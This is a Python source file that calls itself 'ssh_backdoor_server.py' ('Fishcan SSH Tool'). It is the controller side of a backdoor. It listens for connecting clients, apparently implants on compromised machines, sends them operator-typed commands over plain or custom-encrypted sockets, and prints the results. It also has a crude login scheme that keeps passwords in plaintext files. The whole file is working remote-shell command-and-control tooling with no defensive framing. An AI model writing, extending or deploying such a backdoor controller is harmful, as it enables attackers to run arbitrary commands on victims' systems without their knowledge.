import socket
import threading
import sys
import ssh_cryptor
import argparse
import textwrap


IP = '192.168.31.51'
PORT = 10000
 


def receive_from(connection, timeout=100):
    connection.settimeout(timeout)
    recv_len = 1
    response = ''
    while recv_len:
        data = connection.recv(4096)
        recv_len = len(data)
        response += data.decode(encoding='gb2312', errors='ignore')
        if recv_len < 4096:
            break
    if response:
        return response
                                                
            
                

def handler(client_socket):
    while True:
        buffer = input('Command:')
        if buffer == 'exit':
            client_socket.send(buffer.encode())
            print('[*] Client Exit.')                                    
            client_socket.close()
            break
        client_socket.send(buffer.encode())
        request = receive_from(client_socket)
        print(f'[*] Output: {request}')
                        
        
            

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server.bind((IP, PORT))
    except Exception as e:
        print('problem on bind: %r' % e)
        print('[!!] Failed to listen on %s:%d' % (IP, PORT))
        print('[!!] Check for other listening sockets or correct permissions.')
        sys.exit(0)
    
    print('[*] Listening on %s:%d' % (IP, PORT))
    server.listen(5)
    while True:
        client_socket, addr =  server.accept()
        print(f'[*] Accept connection from {addr[0]}:{addr[1]}')
        client_handler = threading.Thread(target=handler, args=(client_socket,))
        client_handler.start()
        



class SSH_server:
    def __get_key__(self):
        ssh_cryptor.generate(pub_name='spub', pri_name='spri')
                        
                        
                        
    def receive_from(self, connection, timeout=100):
        connection.settimeout(timeout)
        recv_len = 1
        response = b''
        while recv_len:
            data = connection.recv(4096)
            recv_len = len(data)
            response += data
            if recv_len < 4096:
                break
        if response:
            data = ssh_cryptor.decrypt(response, type='spri')
            return data.decode(encoding='gb2312', errors='ignore')
                                                                        
                                    
    def login_and_account(self, client_socket):                            
        action = receive_from(client_socket)
        if action == 'login':
            self.handler(client_socket)
        elif action == 'account':
            with open('key.spub', 'rb') as f:
                key = f.read()
                f.close()
            client_socket.send(key)                                    
            user = self.receive_from(client_socket)
            print('[*] Account Creating ...')
            print(f'[*] User: {user}')
            password = self.receive_from(client_socket)
            with open(f'{user}.txt', 'w+') as f:
                f.write(password)
                f.close()
                                                
            print('[***] Account Create Successfully!\n')
                                    
                                    
            self.handler(client_socket)
                                    
                        
    def handler(self, client_socket):
        with open('key.spub', 'rb') as f:
            key = f.read()
            f.close()
            client_socket.send(key)
                        
            user = self.receive_from(client_socket)
            print(f'[*] User: {user}')
                        
            password = self.receive_from(client_socket)
                        
            try:
                with open(f'{user}.txt', 'r+') as f:
                    password_ = f.read()
                    f.close()
            except FileNotFoundError:
                password_ = None
                client_socket.send(b'Refuse')
                                    
            if password_:
                        
                if password == f'{password_}':
                    client_socket.send(b'Connected')
                    print('[***] Client Login Successful!\n')
                else:
                    client_socket.send(b'Refuse')
                    print('[!] Client Login Fail.')
                    print('[*] Please Check Password.')
                    client_socket.close()
                        
                        
                                    
                client_key = client_socket.recv(4096)
                with open('key.clientkey', 'wb') as f:
                    f.write(client_key)
                    f.close()
                while True:
                    buffer = ''
                    while buffer == '' :
                        buffer = input('Command:')
                    if buffer == 'exit':
                        client_socket.send(ssh_cryptor.encrypt(buffer.encode(), type='clientkey'))
                        print(f'[*] Client Exit.')                                    
                        client_socket.close()
                        break
                    client_socket.send(ssh_cryptor.encrypt(buffer.encode(), type='clientkey'))
                    request = self.receive_from(client_socket)
                    print(f'[*] Output: {request}')
                                                
            else:
                print('[!] Client Login Fail.')
                print('[*] Please Check Whether Create Account Or Not.')                                    
                                                
                                
                                    
                        
    def main(self):
        self.__get_key__()
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind((IP, PORT))
        except Exception as e:
            print('problem on bind: %r' % e)
            print('[!!] Failed to listen on %s:%d' % (IP, PORT))
            print('[!!] Check for other listening sockets or correct permissions.')
            sys.exit(0)
                            
        print('[*] Listening on %s:%d' % (IP, PORT))
        server.listen(5)
        while True:
            client_socket, addr =  server.accept()
            print(f'[*] Accept connection from {addr[0]}:{addr[1]}\n')
            client_handler = threading.Thread(target=self.login_and_account, args=(client_socket,))
            client_handler.start()
                                
                        
            



        
if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Fishcan SSH Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
        ssh_backdoor_server.py -t 1.1.1.1 -p 9000
        '''))
    parser.add_argument('-t', '--target', default='192.168.31.51', help='specified IP')
    parser.add_argument('-p', '--port', type=int, default=10000, help='specified port')
    arg = parser.parse_args()
    IP = arg.target
    PORT = arg.port            
    a = SSH_server()
    a.main()